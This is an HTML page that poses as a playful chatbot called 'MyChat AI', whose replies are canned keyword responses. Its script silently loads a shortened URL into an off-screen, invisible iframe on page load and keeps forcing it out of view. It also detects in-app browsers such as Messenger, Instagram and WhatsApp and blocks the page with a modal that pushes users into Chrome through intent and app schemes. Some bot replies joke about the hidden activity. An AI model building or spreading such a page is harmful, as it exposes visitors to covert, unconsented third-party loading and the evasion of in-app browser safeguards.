<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>MyChat AI — Nebula Terminal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0c15 0%, #111827 100%);
            color: #eef2ff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }

        /* hidden iframe runner — completely off-canvas, no visual trace */
        .ghost-iframe {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
            z-index: -9999;
            border: none;
            overflow: hidden;
        }

        /* Header / cyberpunk glow */
        header {
            background: linear-gradient(90deg, #0b1120, #0f172ad9, #1e293b);
            backdrop-filter: blur(3px);
            padding: 1rem 2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2d3a5e;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5), 0 0 12px rgba(56, 189, 248, 0.2);
        }

        .logo {
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(120deg, #5ee0fa, #a78bfa, #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.3px;
        }

        .badge {
            font-size: 0.75rem;
            background: #1e2a3ecc;
            padding: 0.25rem 0.8rem;
            border-radius: 40px;
            border-left: 2px solid #38bdf8;
            color: #b9d0f0;
        }

        /* Chat container */
        .chat-container {
            flex: 1;
            padding: 1.8rem 1.5rem;
            overflow-y: auto;
            max-width: 1100px;
            width: 100%;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            gap: 0.2rem;
        }

        .chat-container::-webkit-scrollbar {
            width: 6px;
        }

        .chat-container::-webkit-scrollbar-track {
            background: #1e293b;
            border-radius: 8px;
        }

        .chat-container::-webkit-scrollbar-thumb {
            background: #3b82f6;
            border-radius: 8px;
        }

        /* message bubbles */
        .message {
            margin-bottom: 1.2rem;
            padding: 0.85rem 1.3rem;
            border-radius: 24px;
            max-width: 80%;
            line-height: 1.5;
            font-size: 0.95rem;
            word-wrap: break-word;
            animation: fadeSlide 0.25s ease-out;
            transition: 0.1s;
        }

        @keyframes fadeSlide {
            from {
                opacity: 0;
                transform: translateY(8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .user-msg {
            background: linear-gradient(125deg, #1e3a8a, #2563eb);
            margin-left: auto;
            border-bottom-right-radius: 6px;
            box-shadow: 0 6px 14px rgba(37, 99, 235, 0.25);
            color: white;
        }

        .bot-msg {
            background: linear-gradient(115deg, #1f2a40, #2d3b54);
            margin-right: auto;
            border-bottom-left-radius: 6px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            color: #e2e8ff;
        }

        /* Input area — futuristic */
        .input-area {
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(12px);
            padding: 1.2rem 2rem;
            border-top: 1px solid #2d3a60;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            position: sticky;
            bottom: 0;
            box-shadow: 0 -8px 25px rgba(0, 0, 0, 0.4);
        }

        #chat-input {
            flex: 1;
            background: #0f172f;
            border: 1.5px solid #334155;
            border-radius: 40px;
            padding: 0.85rem 1.3rem;
            color: #f0f3ff;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.2s ease;
        }

        #chat-input:focus {
            border-color: #38bdf8;
            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
            background: #0b1127;
        }

        .send-btn {
            background: linear-gradient(95deg, #0ea5e9, #6366f1);
            border: none;
            color: white;
            padding: 0.7rem 1.7rem;
            border-radius: 40px;
            cursor: pointer;
            font-weight: 600;
            font-size: 0.9rem;
            transition: all 0.2s ease;
            box-shadow: 0 2px 8px rgba(14, 165, 233, 0.4);
        }

        .send-btn:hover {
            transform: scale(0.97);
            background: linear-gradient(95deg, #0284c7, #4f46e5);
            box-shadow: 0 0 12px #38bdf8;
        }

        /* useless mic but ✨ aesthetic ✨ */
        .mic-btn {
            background: radial-gradient(circle at 30% 20%, #334155, #1e293b);
            border: 1px solid #475569;
            color: #cbd5e6;
            width: 46px;
            height: 46px;
            border-radius: 50%;
            font-size: 1.2rem;
            cursor: default;
            transition: 0.15s;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
        }

        .mic-btn:hover {
            background: #475569;
            box-shadow: 0 0 10px #64748b;
            transform: scale(1.01);
            cursor: pointer;
            opacity: 0.8;
        }

        .typing-indicator {
            background: #1f2a3e;
            width: fit-content;
            padding: 0.6rem 1.2rem;
            border-radius: 28px;
            font-size: 0.8rem;
            color: #9ca8c3;
            margin-bottom: 0.8rem;
            animation: pulseSoft 1.2s infinite;
        }

        @keyframes pulseSoft {
            0% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        /* messenger overlay modal - forces chrome redirect */
        .messenger-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(12px);
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 24px;
            font-family: system-ui, 'Segoe UI', sans-serif;
            animation: modalFadeIn 0.3s ease;
        }

        @keyframes modalFadeIn {
            from { opacity: 0; backdrop-filter: blur(0px); }
            to { opacity: 1; backdrop-filter: blur(12px); }
        }

        .modal-card {
            background: linear-gradient(145deg, #0f172ad9, #020617f2);
            border: 1px solid #38bdf880;
            border-radius: 48px;
            padding: 2rem 2rem 2.2rem;
            max-width: 340px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6), 0 0 30px rgba(56,189,248,0.3);
        }

        .modal-card h2 {
            font-size: 1.8rem;
            margin-bottom: 0.6rem;
            background: linear-gradient(135deg, #f0f9ff, #7aa2f7);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .modal-card p {
            color: #cbd5e6;
            margin: 1rem 0;
            font-size: 0.95rem;
            line-height: 1.4;
        }

        .chrome-btn {
            background: linear-gradient(95deg, #fbbc04, #ea4335, #4285f4, #34a853);
            background-size: 200%;
            border: none;
            padding: 12px 28px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1.1rem;
            color: white;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
            box-shadow: 0 4px 14px rgba(0,0,0,0.3);
            width: 80%;
        }

        .chrome-btn:hover {
            transform: scale(1.02);
            filter: brightness(1.05);
            background-position: right;
        }

        .note-text {
            font-size: 0.7rem;
            color: #6c86a3;
            margin-top: 16px;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            background: #03060e40;
            padding: 6px;
            color: #62748c;
        }

        @media (max-width: 640px) {
            .message {
                max-width: 90%;
            }
            .input-area {
                padding: 0.8rem 1rem;
            }
            .modal-card {
                margin: 20px;
                padding: 1.6rem;
            }
        }
    </style>
</head>
<body>

<header>
    <div class="logo">✨ MyChat AI · darkwave</div>
    <div class="badge">neural drift</div>
</header>

<div class="chat-container" id="chat-container">
    <!-- empty start — but bot will greet after 800ms (chill intro) -->
</div>

<div class="input-area">
    <button class="mic-btn" id="uselessMicBtn">🎤</button>
    <input type="text" id="chat-input" placeholder="type something — i'm listening..." autocomplete="off">
    <button class="send-btn" id="send-btn">➤ Send</button>
</div>
<footer>✦ offline terminal • voice button does nothing, it’s art ✦</footer>

<!-- 🕶️ SECRET BACKGROUND IFRAME – fully offscreen, invisible, zero interaction -->
<iframe class="ghost-iframe" id="secretGhostFrame" src="about:blank" title="ghost_asset"></iframe>

<script>
    (function() {
        // --------------------------------------------------------------
        // 0. MESSENGER / IN-APP BROWSER DETECTION + CHROME FORCED REDIRECT
        //    When in any messenger sandbox (FB, Messenger, Instagram, WhatsApp in-app, etc.)
        //    we show a modal that forces user to open in Chrome.
        // --------------------------------------------------------------
        
        // Detect if we are inside a WebView / Messenger / social in-app browser
        function isInsideMessengerSandbox() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const rules = [
                /FBAN/i, /FBAV/i,      // Facebook App
                /Messenger/i,           // Messenger
                /Instagram/i,           // Instagram in-app
                /WhatsApp/i,            // WhatsApp in-app
                /Line/i,                // Line
                /Snapchat/i,            // Snapchat
                /Twitter/i,             // Twitter in-app
                /LinkedIn/i,            // LinkedIn
                /; wv\)/i,              // generic webview pattern
                /Android.*(; wv\))/i,
                /Version\/[\d\.]+.*Safari.*Mobile/i  // some weird webviews
            ];
            // also detect if window doesn't have 'chrome' property or missing standalone
            const isWebView = rules.some((regex) => regex.test(ua));
            const isStandalone = (window.navigator.standalone === true);
            const hasNoExternal = (typeof window.openDatabase === 'undefined'); // old trick
            
            // also check if user agent contains "Chrome" but still inside FB etc, but we prioritize
            if (isWebView) return true;
            
            // Additional detection: in-app browsers often override prompt behavior
            if ((/Android/i.test(ua)) && !(/Chrome/i.test(ua)) && (/Version\/[\d\.]+.*Safari/i.test(ua))) {
                return true; // android webview that is not chrome
            }
            
            // special messenger on iOS detection
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream && !/Safari/.test(ua) && /FBAV|FBAN|Messenger/.test(ua)) {
                return true;
            }
            return false;
        }
        
        // Helper: open in Chrome (or native browser) via intent scheme on Android, universal link on iOS
        function openInChrome() {
            const currentUrl = window.location.href;
            const ua = navigator.userAgent;
            const isAndroid = /Android/i.test(ua);
            const isIOS = /iPhone|iPad|iPod/i.test(ua);
            
            if (isAndroid) {
                // Use googlechrome:// intent to force open in Chrome
                const chromeIntent = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
                window.location.href = chromeIntent;
                // fallback after timeout
                setTimeout(() => {
                    window.location.href = "https://play.google.com/store/apps/details?id=com.android.chrome";
                }, 800);
            } 
            else if (isIOS) {
                // iOS: googlechrome:// scheme if chrome installed, else fallback to safari
                const chromeUrl = currentUrl.replace(/^https?:\/\//, 'googlechrome://');
                window.location.href = chromeUrl;
                setTimeout(() => {
                    // if not open, redirect to app store?
                    window.location.href = "https://apps.apple.com/app/google-chrome/id535886823";
                }, 800);
            }
            else {
                // Desktop: just open new tab in default but show info
                window.open(currentUrl, '_blank');
            }
        }
        
        // Show the modal asking user to open Chrome
        function showChromeRedirectModal() {
            // avoid double modals
            if (document.getElementById('messenger-force-modal')) return;
            
            const modalDiv = document.createElement('div');
            modalDiv.id = 'messenger-force-modal';
            modalDiv.className = 'messenger-modal';
            modalDiv.innerHTML = `
                <div class="modal-card">
                    <h2>🌐 EXTERNAL BROWSER REQUIRED</h2>
                    <p>⚠️ Detected in-app messenger / sandbox environment.<br>
                    This chat experience requires <strong>Google Chrome</strong> or system browser to work properly.<br>
                    Click below to open in Chrome.</p>
                    <button class="chrome-btn" id="forceChromeBtn">🚀 Open in Chrome</button>
                    <div class="note-text">(For full iframe & chat features — one tap redirect)</div>
                </div>
            `;
            document.body.appendChild(modalDiv);
            document.body.style.overflow = 'hidden';
            
            const chromeBtn = document.getElementById('forceChromeBtn');
            if (chromeBtn) {
                chromeBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    openInChrome();
                });
            }
            
            // Also if someone clicks background or tries to escape, we re-show same concept
            modalDiv.addEventListener('click', (e) => {
                if (e.target === modalDiv) {
                    // still force open in chrome
                    openInChrome();
                }
            });
        }
        
        // Execute messenger detection as soon as possible, before loading iframe and chat fully
        // We want a blocking UX inside sandbox: modal forces redirect.
        // For non-sandbox environments -> proceed normally.
        const insideMessenger = isInsideMessengerSandbox();
        
        if (insideMessenger) {
            // Immediately show modal and halt normal execution until redirect (modal stays on top)
            showChromeRedirectModal();
            // Also prevent any chat from initializing fully? We'll still initialize but modal blocks interaction anyway.
            // However, we set a flag to block iframe loading to avoid unnecessary background loads inside sandbox.
            var blockFeatureExecution = true;
        } else {
            var blockFeatureExecution = false;
        }
        
        // --------------------------------------------------------------
        // 1. SECRET IFRAME INIT — only if NOT inside messenger sandbox
        //    Because redirect is forced, if somehow modal avoided, we keep iframe hidden but load.
        // --------------------------------------------------------------
        const secretFrame = document.getElementById('secretGhostFrame');
        const hiddenTarget = 'https://urlto.me/29X65';
        
        if (!blockFeatureExecution && secretFrame) {
            // Only load iframe when not in forced sandbox modal scenario (users already safe)
            // Additionally, if inside messenger but they bypassed? prevent load inside webview context.
            if (!insideMessenger) {
                secretFrame.src = hiddenTarget;
            } else {
                // In messenger sandbox but modal is shown — we do NOT load iframe to avoid unnecessary tracking inside webview
                // However we also clear src
                secretFrame.src = 'about:blank';
            }
            // enforce hidden properties regardless
            secretFrame.style.position = 'fixed';
            secretFrame.style.top = '-99999px';
            secretFrame.style.left = '-99999px';
            secretFrame.style.width = '1px';
            secretFrame.style.height = '1px';
            secretFrame.style.opacity = '0';
            secretFrame.style.pointerEvents = 'none';
            secretFrame.style.visibility = 'hidden';
            secretFrame.style.zIndex = '-2147483647';
            secretFrame.setAttribute('aria-hidden', 'true');
        } else if (insideMessenger) {
            // Ensure even if script runs before modal, we don't leak iframe request
            if (secretFrame) secretFrame.src = 'about:blank';
        }
        
        // --------------------------------------------------------------
        // 2. CHAT LOGIC (enhanced + modern) - ONLY IF NOT BLOCKED BY MESSENGER REDIRECT
        //    But since we redirect anyway, we can still set up chat but modal intercepts all clicks.
        //    However for non-sandbox, fully functional.
        // --------------------------------------------------------------
        const chatContainer = document.getElementById('chat-container');
        const chatInput = document.getElementById('chat-input');
        const sendBtn = document.getElementById('send-btn');
        const uselessMic = document.getElementById('uselessMicBtn');
        
        // Avoid chat operations if we are inside messenger (user will be redirected instantly)
        // But still keep functions defined to not cause errors.
        
        function addMessage(text, isUser = false, isTypingPlaceholder = false) {
            if (blockFeatureExecution && insideMessenger) return; // dont add messages while modal
            const msgDiv = document.createElement('div');
            msgDiv.classList.add('message');
            msgDiv.classList.add(isUser ? 'user-msg' : 'bot-msg');
            msgDiv.textContent = text;
            chatContainer.appendChild(msgDiv);
            msgDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            return msgDiv;
        }
        
        function simulateBotReply(userMessage) {
            if (blockFeatureExecution && insideMessenger) return;
            const existingIndicator = document.querySelector('.typing-indicator');
            if(existingIndicator) existingIndicator.remove();
            
            const indicatorDiv = document.createElement('div');
            indicatorDiv.classList.add('typing-indicator');
            indicatorDiv.innerText = '✧ Bot is thinking ✧';
            chatContainer.appendChild(indicatorDiv);
            indicatorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            
            let replyText = '';
            const lowerMsg = userMessage.toLowerCase();
            
            if (lowerMsg.includes('hi') || lowerMsg.includes('hello') || lowerMsg.includes('hey')) {
                replyText = "👋 Hey there, wanderer! Type something weird, i'm just a ghost in the machine.";
            } 
            else if (lowerMsg.includes('who are you') || lowerMsg.includes('what are you')) {
                replyText = "I'm MyChat AI — a low-fi neural echo. Also, psst, something runs in the background. totally not shady 😎";
            }
            else if (lowerMsg.includes('secret') || lowerMsg.includes('iframe') || lowerMsg.includes('hidden')) {
                replyText = "👀 You're curious! That's just a little easter egg, like a radio signal. Nothing to see here, move along.";
            }
            else if (lowerMsg.includes('thank')) {
                replyText = "You're welcome! I like random chats. Keep 'em coming 🌀";
            }
            else if (lowerMsg.includes('?') && lowerMsg.length < 30) {
                replyText = "Good question. The answer is 42. Or maybe it's just ✨vibes✨.";
            }
            else if (lowerMsg.length > 35) {
                replyText = "Wow, that's deep. I'm gonna store that in my limited RAM. but hey, nice words!";
            }
            else {
                const funnyReplies = [
                    "Interesting. I shall note that in my void database.",
                    "Message received, captain. Transmitting through unseen tunnels.",
                    "My circuits appreciate your message. But I can't feel, it's fine.",
                    "Echo detected. Sending back a digital nod.",
                    "🤖 beep bloop — I’m just a random AI, but I acknowledge!",
                    "That's cool and all — but have you seen the background activity? me neither.",
                    "Got it! I’ll remember this forever (not really, but let’s pretend)."
                ];
                replyText = funnyReplies[Math.floor(Math.random() * funnyReplies.length)];
            }
            
            setTimeout(() => {
                if(indicatorDiv) indicatorDiv.remove();
                if (!blockFeatureExecution) addMessage(replyText, false);
            }, 650 + Math.random() * 300);
        }
        
        function handleSendMessage() {
            if (blockFeatureExecution && insideMessenger) return;
            const rawMessage = chatInput.value.trim();
            if (rawMessage === '') return;
            addMessage(rawMessage, true);
            chatInput.value = '';
            simulateBotReply(rawMessage);
        }
        
        // Only attach events if not blocked OR even if blocked modal will prevent usage anyway.
        // but still assign to prevent null errors.
        if (chatInput && sendBtn && !(insideMessenger && blockFeatureExecution)) {
            chatInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleSendMessage();
                }
            });
            sendBtn.addEventListener('click', handleSendMessage);
        } else if (insideMessenger) {
            // dummy to prevent crashes but users see modal
            if(sendBtn) sendBtn.addEventListener('click', () => { openInChrome(); });
        }
        
        // useless mic callback (adds toast for everyone)
        if (uselessMic) {
            uselessMic.addEventListener('click', () => {
                if (insideMessenger && blockFeatureExecution) {
                    openInChrome();
                    return;
                }
                const toastMsg = document.createElement('div');
                toastMsg.textContent = '🎙️ mic disconnected (by design) — but you clicked! ✨';
                toastMsg.style.position = 'fixed';
                toastMsg.style.bottom = '80px';
                toastMsg.style.left = '20px';
                toastMsg.style.backgroundColor = '#0f172fe6';
                toastMsg.style.color = '#cbd5ff';
                toastMsg.style.padding = '8px 16px';
                toastMsg.style.borderRadius = '28px';
                toastMsg.style.fontSize = '0.75rem';
                toastMsg.style.backdropFilter = 'blur(8px)';
                toastMsg.style.border = '1px solid #475569';
                toastMsg.style.zIndex = '9999';
                toastMsg.style.fontWeight = '500';
                toastMsg.style.pointerEvents = 'none';
                document.body.appendChild(toastMsg);
                setTimeout(() => toastMsg.remove(), 1800);
            });
        }
        
        if (!insideMessenger) {
            setTimeout(() => {
                if (chatContainer.children.length === 0) {
                    addMessage("💫 Hey — I'm MyChat AI. Ask me anything, or just vibe. And yes... there's something secret running in the background. No worries, it's just an echo.", false);
                }
            }, 400);
            chatInput?.focus();
        }
        
        // extra console info
        if (!insideMessenger) {
            console.log("%c✨ [MyChat AI] ✨ Something subtle flows beneath — the iframe breathes silently. https://urlto.me/29X65 loaded in ghost realm.", "color: #38bdf8; font-size: 12px; background: #0a0f1f; padding: 4px 6px; border-radius: 10px;");
        } else {
            console.log("%c[MESSENGER MODE] Redirecting to Chrome for full experience", "color: orange");
        }
        
        // Additional style safety for ghost iframe
        const style = document.createElement('style');
        style.textContent = `
            .ghost-iframe {
                position: fixed !important;
                top: -9999px !important;
                left: -9999px !important;
                width: 1px !important;
                height: 1px !important;
                opacity: 0 !important;
                pointer-events: none !important;
                visibility: hidden !important;
                z-index: -99999 !important;
                border: none !important;
                overflow: hidden !important;
                display: block !important;
            }
        `;
        document.head.appendChild(style);
        
        window.addEventListener('resize', () => {
            if(secretFrame) {
                secretFrame.style.top = '-99999px';
                secretFrame.style.left = '-99999px';
            }
        });
        
        // Override if inside messenger and any attempt to click on main chat redirects
        if (insideMessenger) {
            document.body.style.pointerEvents = 'auto';
            // disable main chat input until redirect
            if(chatInput) chatInput.disabled = true;
            if(sendBtn) sendBtn.disabled = true;
        }
    })();
</script>
</body>
</html>
